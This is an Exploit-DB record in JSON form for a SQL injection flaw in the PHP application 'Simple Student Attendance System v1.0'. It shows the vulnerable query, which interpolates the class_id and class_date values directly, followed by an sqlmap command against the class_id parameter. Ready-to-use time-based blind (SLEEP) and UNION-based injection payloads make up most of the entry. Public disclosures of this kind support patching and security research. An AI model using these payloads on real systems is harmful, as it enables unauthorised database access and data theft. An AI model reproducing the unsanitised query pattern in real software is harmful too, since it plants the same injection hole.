{"source": "https://www.exploit-db.com/exploits/51842", "vulnName": "Simple Student Attendance System v1.0 - 'classid' Time Based Blind & Union Based SQL Injection", "vulnEDBID": "51842", "vulnCVE": "N/A", "author": "GNANARAJ MAUVIEL", "exploitType": "REMOTE", "platform": "PHP", "datePublished": "2024-03-03", "vulnContent": "# Exploit Title: Simple Student Attendance System v1.0 -  'classid' Time Based Blind & Union Based SQL Injection\n# Date: 26 December 2023\n# Exploit Author: Gnanaraj Mauviel (@0xm3m)\n# Vendor: oretnom23\n# Vendor Homepage: https://www.sourcecodester.com/php/17018/simple-student-attendance-system-using-php-and-mysql.html\n# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-attendance.zip\n# Version: v1.0\n# Tested on: Mac OSX, XAMPP, Apache, MySQL\n\n-------------------------------------------------------------------------------------------------------------------------------------------\n\nSource Code(/php-attendance/classes/actions.class.php):\n\npublic function attendanceStudents($class_id = \"\", $class_date = \"\"){\nif(empty($class_id) || empty($class_date))\nreturn [];\n$sql = \"SELECT `students_tbl`.*, COALESCE((SELECT `status` FROM `attendance_tbl` where `student_id` = `students_tbl`.id and `class_date` = '{$class_date}' ), 0) as `status` FROM `students_tbl` where `class_id` = '{$class_id}' order by `name` ASC\";\n$qry = $this->conn->query($sql);\n$result = $qry->fetch_all(MYSQLI_ASSOC);\nreturn $result;\n}\n\n-> sqlmap -u \"http://localhost/php-attendance/?page=attendance&class_id=446&class_date=0002-02-20\" --batch\n---\nParameter: class_id (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: page=attendance&class_id=446' AND (SELECT 5283 FROM (SELECT(SLEEP(5)))zsWT) AND 'nqTi'='nqTi&class_date=0002-02-20\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 6 columns\n    Payload: page=attendance&class_id=446' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717671,0x7154766a5453645a7a4d497071786a6f4b647a5a6d4162756c72636b4a4555746d555a5a71614d4c,0x71767a7a71),NULL-- -&class_date=0002-02-20\n---\n            "}